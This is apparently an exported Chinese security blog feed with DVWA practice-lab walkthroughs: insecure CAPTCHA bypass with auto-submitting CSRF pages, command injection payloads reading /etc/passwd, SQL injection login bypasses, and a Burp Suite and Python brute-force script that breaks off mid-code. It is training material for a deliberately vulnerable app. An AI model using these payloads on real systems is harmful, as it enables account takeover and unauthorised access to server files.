title="LOW级别"></a>LOW级别</h1><p>服务器将改密操作分成了两步：</p><ol><li><p>检查用户输入的验证码，验证通过后，服务器返回表单</p></li><li><p>客户端提交<code>post</code>请求，服务器完成更改密码的操作</p></li></ol><p>这其中存在明显的逻辑漏洞，服务器仅仅通过检查<code>Change</code>、<code>step</code>参数来判断用户是否已经输入了正确的验证码</p><p><img src="/images/baji/dvwa/insecure captcha/3.png" alt="3.png"></p><p>因未科学上网，验证码无法显示</p><h2 id="修改参数绕过"><a href="#修改参数绕过" class="headerlink" title="修改参数绕过"></a>修改参数绕过</h2><ol><li><p>抓包修改<code>step</code>参数</p><p> <img src="/images/baji/dvwa/insecure captcha/4.png" alt="4.png"></p><p> 因为没有翻墙，所以没能成功显示验证码，发送的请求包中也就没有<code>recaptcha_challenge_field</code>、<code>recaptcha_response_field</code>两个参数</p><p> 将<code>step</code>参数由1修改为2</p></li><li><p>密码修改成功</p><p> <img src="/images/baji/dvwa/insecure captcha/5.png" alt="5.png"></p></li></ol><h2 id="构造攻击页面"><a href="#构造攻击页面" class="headerlink" title="构造攻击页面"></a>构造攻击页面</h2><p>由于没有任何的防御<code>CSRF</code>机制，我们可以轻易地构造攻击页面</p><ol><li><p>编写攻击页面<code>xx.html</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;      </span><br><span class="line"></span><br><span class="line">&lt;body onload=&quot;document.getElementById(&apos;transfer&apos;).submit()&quot;&gt;        </span><br><span class="line"></span><br><span class="line"> &lt;div&gt;    </span><br><span class="line"></span><br><span class="line">   &lt;form method=&quot;POST&quot; id=&quot;transfer&quot; action=&quot;http://172.16.12.93/vulnerabilities/captcha/&quot;&gt;     </span><br><span class="line"></span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password123&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password123&quot;&gt;     </span><br><span class="line"></span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;step&quot; value=&quot;2&quot;&gt;  </span><br><span class="line"></span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;        </span><br><span class="line"></span><br><span class="line">&lt;/form&gt;        </span><br><span class="line"></span><br><span class="line"> &lt;/div&gt;        </span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li><li><p>将攻击页面放置到攻击者的公网服务器(此处为192.168.43.132)上</p></li><li><p>向被攻击者发送恶意链接</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.132/xx.html</span><br></pre></td></tr></table></figure></li><li><p>被攻击者在登陆<code>DVWA</code>的情况下点击恶意链接，则密码被修改成功</p><p> 美中不足的是，被攻击者看到更改密码成功的界面（这是因为修改密码成功后，服务器会返回302，实现自动跳转），从而意识到自己遭到了攻击</p><p> <img src="/images/baji/dvwa/insecure captcha/6.png" alt="6.png"></p></li></ol><hr><h1 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h1><p><code>Medium</code>级别的代码在第二步验证时，参加了对参数<code>passed_captcha</code>的检查，如果参数值为<code>true</code>，则认为用户已经通过了验证码检查，然而用户依然可以通过伪造参数绕过验证</p><h2 id="修改参数绕过-1"><a href="#修改参数绕过-1" class="headerlink" title="修改参数绕过"></a>修改参数绕过</h2><ol><li><p>抓包修改<code>step</code>参数，增加<code>passed_captcha</code>参数，绕过验证码</p><p> <img src="/images/baji/dvwa/insecure captcha/7.png" alt="7.png"></p></li><li><p>密码修改成功</p><p> <img src="/images/baji/dvwa/insecure captcha/8.png" alt="8.png"></p></li></ol><h2 id="构造攻击页面-1"><a href="#构造攻击页面-1" class="headerlink" title="构造攻击页面"></a>构造攻击页面</h2><p>依然可以进行<code>CSRF</code>攻击</p><ol><li><p>编写攻击页面<code>cc.html</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;      </span><br><span class="line"></span><br><span class="line">&lt;body onload=&quot;document.getElementById(&apos;transfer&apos;).submit()&quot;&gt;        </span><br><span class="line"></span><br><span class="line"> &lt;div&gt;    </span><br><span class="line"></span><br><span class="line">   &lt;form method=&quot;POST&quot; id=&quot;transfer&quot; action=&quot;http://172.16.12.93/vulnerabilities/captcha/&quot;&gt;     </span><br><span class="line"></span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password123&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password123&quot;&gt;</span><br><span class="line">           </span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;passed_captcha&quot; value=&quot;true&quot;&gt;</span><br><span class="line">           </span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;step&quot; value=&quot;2&quot;&gt;  </span><br><span class="line"></span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;        </span><br><span class="line"></span><br><span class="line">&lt;/form&gt;        </span><br><span class="line"></span><br><span class="line"> &lt;/div&gt;        </span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li><li><p>将攻击页面放置到攻击者的公网服务器(此处为192.168.43.132)上</p></li><li><p>向被攻击者发送恶意链接</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.132/cc.html</span><br></pre></td></tr></table></figure></li><li><p>被攻击者在登陆<code>DVWA</code>的情况下点击恶意链接，则密码被修改成功</p><p> 不过依然会跳转到更改密码成功的界面</p><p> <img src="/images/baji/dvwa/insecure captcha/6.png" alt="6.png"></p></li></ol><hr><h1 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h1><p>服务器的验证逻辑是当<code>$resp</code>（这里是指谷歌返回的验证结果）是<code>true</code>，或者参数<code>g-recaptcha-response</code>等于<code>hidd3n_valu3</code>并且<code>http</code>包头的<code>User-Agent</code>参数等于<code>reCAPTCHA</code>时，就认为验证码正确</p><p><code>$resp</code>参数不可控</p><ol><li><p>抓包修改参数</p><p> 修改<code>User-Agent</code>值为<code>reCAPTCHA</code></p><p> 添加<code>g-recaptcha-response</code>参数，值为<code>hidd3n_valu3</code></p><p> <img src="/images/baji/dvwa/insecure captcha/9.png" alt="9.png"></p></li><li><p>密码修改成功</p><p> <img src="/images/baji/dvwa/insecure captcha/6.png" alt="6.png"></p></li></ol><hr><h1 id="Impossible级别"><a href="#Impossible级别" class="headerlink" title="Impossible级别"></a>Impossible级别</h1><p><code>Impossible</code>级别的代码增加了<code>Anti-CSRF token</code> 机制防御<code>CSRF</code>攻击，利用<code>PDO</code>技术防护<code>sql</code>注入，验证过程终于不再分成两部分了，验证码无法绕过，同时要求用户输入之前的密码，进一步加强了身份认证</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
      <category term="DVWA1.10" scheme="http://yoursite.com/tags/DVWA1-10/"/>
    
  </entry>
  
  <entry>
    <title>低版本DVWA靶机</title>
    <link href="http://yoursite.com/2019/05/22/%E4%BD%8E%E7%89%88%E6%9C%ACDVWA%E9%9D%B6%E6%9C%BA-1/"/>
    <id>http://yoursite.com/2019/05/22/低版本DVWA靶机-1/</id>
    <published>2019-05-22T13:25:00.000Z</published>
    <updated>2020-02-24T04:18:04.091Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><blockquote><p>因高版本<code>xampp</code>中<code>php</code>版本过高，部分<code>dvwa</code>靶机环境无法使用，所以重新部署<code>DVWA</code>环境</p></blockquote><hr><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p><code>centos</code>7 32位</p><p><code>xampp</code>版本1.7.3</p><p><code>DVWA</code>版本1.10</p><hr><h1 id="xampp部署"><a href="#xampp部署" class="headerlink" title="xampp部署"></a>xampp部署</h1><ol><li><p>解压</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar xzvf xampp-linux-1.7.3.tar.gz -C /opt</span><br></pre></td></tr></table></figure></li><li><p>启动<code>xampp</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/lampp</span><br><span class="line">./lampp start</span><br></pre></td></tr></table></figure></li></ol><ol start="3"><li><p>禁用<code>xampp</code>的<code>ssl</code>功能</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/lampp</span><br><span class="line">./lampp stopssl</span><br></pre></td></tr></table></figure></li></ol><ol start="4"><li><p>配置<code>xampp</code>的安全选项</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./lampp security</span><br></pre></td></tr></table></figure><p><img src="/images/baji/low dvwa/1.png" alt="1.png"></p></li><li><p>重启<code>xampp</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./lampp restart</span><br></pre></td></tr></table></figure></li><li><p>开放防火墙80端口</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=80/tcp --permanent</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure></li><li><p>访问即可</p><p> <img src="/images/baji/low dvwa/2.png" alt="2.png"></p></li></ol><hr><h1 id="DVWA部署"><a href="#DVWA部署" class="headerlink" title="DVWA部署"></a>DVWA部署</h1><ol><li><p>解压</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip DVWA-master.zip -d /opt/lampp/htdocs/</span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li><p>更名</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/lampp/htdocs</span><br><span class="line">mv DVWA-master/ dvwa/</span><br></pre></td></tr></table></figure></li><li><p>更改网站根目录</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /opt/lampp/etc/httpd.conf</span><br></pre></td></tr></table></figure><p> 将<code>DocumentRoot &quot;/opt/lampp/htdocs&quot;</code>更改为<code>DocumentRoot &quot;/opt/lampp/htdocs/dvwa&quot;</code></p></li><li><p>设置<code>dvwa</code>配置文件</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/lampp/htdocs/DVWA-master/config</span><br><span class="line">cp config.inc.php.dist config.inc.php</span><br></pre></td></tr></table></figure></li><li><p>重启<code>lampp</code>服务即可访问</p><p> <img src="/images/baji/dvwa/3.png" alt="3.png"></p></li></ol><hr><h1 id="DVWA配置"><a href="#DVWA配置" class="headerlink" title="DVWA配置"></a>DVWA配置</h1><ol><li><p><code>PHP function allow_url_include: Disabled</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /opt/lampp/etc/php.ini</span><br></pre></td></tr></table></figure><p>将<code>allow_url_include=Off</code>改为<code>allow_url_include=On</code></p></li><li><p><code>reCAPTCHA key: Missing</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /opt/lampp/htdocs/dvwa/config/config.inc.php</span><br></pre></td></tr></table></figure><p>将</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_DVWA[ &apos;recaptcha_public_key&apos; ]  = &apos;&apos;;</span><br><span class="line">$_DVWA[ &apos;recaptcha_private_key&apos; ] = &apos;&apos;;</span><br></pre></td></tr></table></figure><p>改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_DVWA[ &apos;recaptcha_public_key&apos; ]  = &apos;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&apos;;</span><br><span class="line">$_DVWA[ &apos;recaptcha_private_key&apos; ] = &apos;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&apos;;</span><br></pre></td></tr></table></figure></li></ol><ol start="3"><li><p><code>Unable to connect to the database.</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /opt/lampp/htdocs/dvwa/config/config.inc.php</span><br></pre></td></tr></table></figure><p> 将<code>$_DVWA[ &#39;db_password&#39; ] = &#39;&#39;;</code>中的值改为自己<code>mysql</code>的<code>root</code>用户的密码</p></li><li><p>对目录无可写权限</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod 757 /opt/lampp/htdocs/dvwa/hackable/uploads/</span><br><span class="line">chmod 646 /opt/lampp/htdocs/dvwa/external/phpids/0.6/lib/IDS/tmp/phpids_log.txt</span><br><span class="line">chmod 757 /opt/lampp/htdocs/dvwa/config</span><br></pre></td></tr></table></figure></li></ol><ol start="5"><li><p>重启服务</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/lampp/</span><br><span class="line">./lampp restart</span><br></pre></td></tr></table></figure></li><li><p>刷新页面即可</p><p> <img src="/images/baji/dvwa/4.png" alt="4.png"></p></li><li><p>点击<code>Create/Reset Database</code>即可登陆使用</p></li></ol><hr><h1 id="添加开机自启"><a href="#添加开机自启" class="headerlink" title="添加开机自启"></a>添加开机自启</h1><ol><li><p>创建启动文件</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /lib/systemd/system/</span><br><span class="line">vi /lib/systemd/system/lampp.service</span><br></pre></td></tr></table></figure><p> 文件内容如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=lampp</span><br><span class="line">After=network.target</span><br><span class="line">      </span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">ExecStart=/opt/lampp/lampp start</span><br><span class="line">ExecReload=/opt/lampp/lampp restart</span><br><span class="line">ExecStop=/opt/lampp/lampp  stop</span><br><span class="line">PrivateTmp=true </span><br><span class="line">      </span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure></li><li><p>设置启动文件权限</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 754 /lib/systemd/system/lampp.service</span><br></pre></td></tr></table></figure></li><li><p>设置开机自启</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable lampp.service</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
      <category term="DVWA1.10" scheme="http://yoursite.com/tags/DVWA1-10/"/>
    
  </entry>
  
  <entry>
    <title>DVWA1.10之命令注入</title>
    <link href="http://yoursite.com/2019/05/22/DVWA1-10%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2019/05/22/DVWA1-10之命令注入/</id>
    <published>2019-05-21T19:03:00.000Z</published>
    <updated>2020-02-24T04:18:30.719Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="命令注入简介"><a href="#命令注入简介" class="headerlink" title="命令注入简介"></a>命令注入简介</h1><p>命令注入，是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的</p><hr><h1 id="LOW级别"><a href="#LOW级别" class="headerlink" title="LOW级别"></a>LOW级别</h1><p>服务器通过判断操作系统执行不同<code>ping</code>命令，但是对<code>ip</code>参数并未做任何的过滤，导致了严重的命令注入漏洞</p><p>正常执行</p><p><img src="/images/baji/dvwa/command injection/1.png" alt="1.png"></p><ol><li><p>使用<code>&amp;</code>同时执行多条命令</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp; pwd</span><br></pre></td></tr></table></figure><p> <img src="/images/baji/dvwa/command injection/2.png" alt="2.png"></p></li><li><p>使用<code>|</code>(管道符)同时执行多条命令</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 | cat /etc/passwd</span><br></pre></td></tr></table></figure><p> <img src="/images/baji/dvwa/command injection/3.png" alt="3.png"></p></li><li><p>使用<code>&amp;&amp;</code>(与)同样可以执行多条命令</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp;&amp; pwd</span><br></pre></td></tr></table></figure><p> <img src="/images/baji/dvwa/command injection/7.png" alt="7.png"></p></li><li><p>使用<code>||</code>(或)同样可以执行多条命令</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 || cat /etc/passwd</span><br></pre></td></tr></table></figure><p> <img src="/images/baji/dvwa/command injection/9.png" alt="9.png"></p></li><li><p>使用<code>;</code>同样可以执行多条命令</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 ; pwd</span><br></pre></td></tr></table></figure><p> <img src="/images/baji/dvwa/command injection/8.png" alt="8.png"></p></li><li><p>使用`、<code>$()</code>在有些情况下也可执行多条指令</p></li></ol><p><code>&amp;</code>与<code>&amp;&amp;</code>的区别：</p><ol><li><p><code>Command 1&amp;Command 2</code></p><p> 先执行<code>Command 1</code>，不管是否成功，都会执行<code>Command 2</code></p></li><li><p><code>Command 1&amp;&amp;Command 2</code></p><p> 先执行<code>Command 1</code>，执行成功后执行<code>Command 2</code>，否则不执行<code>Command 2</code></p></li></ol><p><code>|</code>与<code>||</code>的区别：</p><ol><li><p><code>Command 1|Command 2</code></p><p> 管道符，<code>Command 2</code>会以<code>Command 1</code>的输出结果为输入进行执行</p></li><li><p><code>Command 1||Command 2</code></p><p> 先执行<code>Command 1</code>失败，才会执行<code>Command 2</code></p></li></ol><hr><h1 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h1><p>服务器端对<code>ip</code>参数做了一定过滤，即把<code>&amp;&amp;</code> 、<code>;</code>删除，本质上采用的是黑名单机制，因此依旧存在安全问题</p><ol><li><p>使用<code>&amp;</code>绕过过滤</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp; cat /etc/passwd</span><br></pre></td></tr></table></figure><p> <img src="/images/baji/dvwa/command injection/4.png" alt="4.png"></p></li><li><p>使用<code>&amp;;&amp;</code>绕过过滤</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp;;&amp; pwd</span><br></pre></td></tr></table></figure><p> <img src="/images/baji/dvwa/command injection/5.png" alt="5.png"></p></li></ol><hr><h1 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h1><p><code>High</code>级别的代码进一步完善了黑名单，过滤了<code>&amp;</code>、<code>;</code>、<code>|</code>、<code>-</code>、<code>$</code>、<code>(</code>、<code>)</code>、<code>||</code>、` 但由于黑名单机制的局限性，我们依然可以绕过</p><p>黑名单看似过滤了所有的非法字符，但仔细观察到是把<code>|</code>（注意这里<code>|</code>后有一个空格）替换为空字符，于是 <code>|</code>（注意这里<code>|</code>前有一个空格）成了“漏网之鱼”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 |cat /etc/passwd</span><br></pre></td></tr></table></figure><p><img src="/images/baji/dvwa/command injection/6.png" alt="6.png"></p><hr><h1 id="Impossible级别"><a href="#Impossible级别" class="headerlink" title="Impossible级别"></a>Impossible级别</h1><p><code>Impossible</code>级别的代码加入了<code>Anti-CSRF token</code>，同时对参数<code>ip</code>进行了严格的限制，只有诸如“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞</p><hr><h1 id="命令注入防御"><a href="#命令注入防御" class="headerlink" title="命令注入防御"></a>命令注入防御</h1><ol><li><p>如特殊需要，尽量不要使用系统命令</p></li><li><p>对敏感字符进行白名单过滤</p></li><li><p>参数值使用引号包括</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
      <category term="DVWA1.10" scheme="http://yoursite.com/tags/DVWA1-10/"/>
    
  </entry>
  
  <entry>
    <title>DVWA1.10之暴力破解</title>
    <link href="http://yoursite.com/2019/05/22/DVWA1-10%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    <id>http://yoursite.com/2019/05/22/DVWA1-10之暴力破解/</id>
    <published>2019-05-21T18:23:00.000Z</published>
    <updated>2020-02-24T04:18:45.207Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="暴力破解简介"><a href="#暴力破解简介" class="headerlink" title="暴力破解简介"></a>暴力破解简介</h1><p>暴力破解，是指黑客利用密码字典，使用穷举法猜解出用户口令，是现在最为广泛使用的攻击手法之一</p><hr><h1 id="LOW级别"><a href="#LOW级别" class="headerlink" title="LOW级别"></a>LOW级别</h1><h2 id="使用BurpSuite进行暴力破解"><a href="#使用BurpSuite进行暴力破解" class="headerlink" title="使用BurpSuite进行暴力破解"></a>使用BurpSuite进行暴力破解</h2><ol><li><p>抓包</p><p> <img src="/images/baji/dvwa/brute force/1.png" alt="1.png"></p></li><li><p>将数据包发送到<code>Intruder</code></p><p> <img src="/images/baji/dvwa/brute force/2.png" alt="2.png"></p><p> 点击<code>Clear</code>清除需要爆破的字段，选中<code>password</code>的值，然后点击<code>Add</code>，将其指定为需爆破的字段</p></li><li><p>选择字典</p><p> <img src="/images/baji/dvwa/brute force/3.png" alt="3.png"></p></li><li><p>开始破解</p><p> 点击右上角<code>Start attack</code></p><p> <img src="/images/baji/dvwa/brute force/4.png" alt="4.png"></p></li><li><p>判断破解出的密码</p><p> <img src="/images/baji/dvwa/brute force/5.png" alt="5.png"></p><p> 当使用<code>password</code>进行破解时，响应包的长度与众不同，即可通过这种方式确定<code>password</code>为正确的密码</p></li></ol><h2 id="通过手工SQL注入进行无密码登陆"><a href="#通过手工SQL注入进行无密码登陆" class="headerlink" title="通过手工SQL注入进行无密码登陆"></a>通过手工SQL注入进行无密码登陆</h2><ol><li><p>永真式注入</p><p> Username ：<code>admin&#39; or &#39;1&#39;=&#39;1</code> </p><p> Password ：（空）</p><p> <img src="/images/baji/dvwa/brute force/6.png" alt="6.png"></p></li><li><p>终止式注入</p><p> Username ：<code>admin&#39; #</code></p><p> Password ：（空）</p><p> <img src="/images/baji/dvwa/brute force/7.png" alt="7.png"></p></li></ol><hr><h1 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h1><p><code>Medium</code>级别的代码主要增加了<code>mysql_real_escape_string</code>函数，这个函数会对字符串中的特殊符号<code>\x00</code>、<code>\n</code>、<code>\r</code>、<code>\</code>、<code>&#39;</code>、<code>&quot;</code>、<code>\x1a</code>）进行转义，基本上能够抵御<code>SQL</code>注入攻击</p><p>虽然<code>SQL</code>注入不再有效，但依然可以使用<code>Burpsuite</code>进行爆破，与<code>Low</code>级别的爆破方法基本一样</p><hr><h1 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h1><p><code>High</code>级别的代码加入了<code>Token</code>，可以抵御<code>CSRF</code>攻击，同时也增加了爆破的难度，通过抓包，可以看到，登录验证时提交了四个参数：<code>username</code>、<code>password</code>、<code>Login</code>以及<code>user_token</code></p><p><img src="/images/baji/dvwa/brute force/8.png" alt="8.png"></p><p>每次服务器返回的登陆页面中都会包含一个随机的<code>user_token</code>的值，用户每次登录时都要将<code>user_token</code>一起提交。服务器收到请求后，会优先做<code>token</code>的检查，再进行<code>SQL</code>查询</p><p><code>High</code>级别的代码中，使用了<code>stripslashes</code>（去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个）、<code>mysql_real_escape_string</code>函数对参数<code>username</code>、<code>password</code>进行过滤、转义，进一步抵御<code>SQL</code>注入</p><h2 id="破解流程"><a href="#破解流程" class="headerlink" title="破解流程"></a>破解流程</h2><ol><li><p>首先请求<code>http://172.16.12.93/vulnerabilities/brute/</code>，获取当前的<code>user_token</code></p></li><li><p>使用获取的<code>user_token</code>，以及字典中的密码进行暴力破解</p></li></ol><h2 id="编写脚本进行暴力破解"><a href="#编写脚本进行暴力破解" class="headerlink" title="编写脚本进行暴力破解"></a>编写脚本进行暴力破解</h2><p>编写<code>Python</code>2版本脚本<code>xx.py</code>，用于对<code>password</code>参数进行爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import urllib2</span><br><span class="line">header=&#123;&apos;Host&apos;: &apos;172.16.12.93&apos;,</span><br><span class="line">&apos;Cache-Control&apos;: &apos;max-age=0&apos;,</span><br><span class="line">&apos;If-None-Match&apos;: &quot;307-52156c6a290c0&quot;,</span><br><span class="line">&apos;If-Modified-Since&apos;: &apos;Mon, 05 Oct 2015 07:51:07 GMT&apos;,</span><br><span class="line">&apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36&apos;,</span><br><span class="line">&apos;Accept&apos;: &apos;*/*&apos;,</span><br><span class="line">&apos;Referer&apos;: &apos;http://172.16.12.93/vulnerabilities/brute/index.php&apos;,</span><br><span class="line">&apos;Accept-Encoding&apos;: &apos;gzip, deflate, sdch&apos;,</span><br><span class="line">&apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.8&apos;,</span><br><span class="line">&apos;Cookie&apos;: &apos;PHPSESSID=1c576ae10332a03dd5c373c9469949e1; security=high&apos;&#125;</span><br><span class="line">requrl = &quot;http://172.16.12.93/vulnerabilities/brute/&quot;</span><br><span class="line"></span><br><span class="line">def get_token(requrl,header):</span><br><span class="line">req = urllib2.Request(url=requrl,headers=header)</span><br><span class="line">response = urllib2.urlopen(req)</span><br><span class="line">print response.getcode(),</span><br><span class="line">the_page = 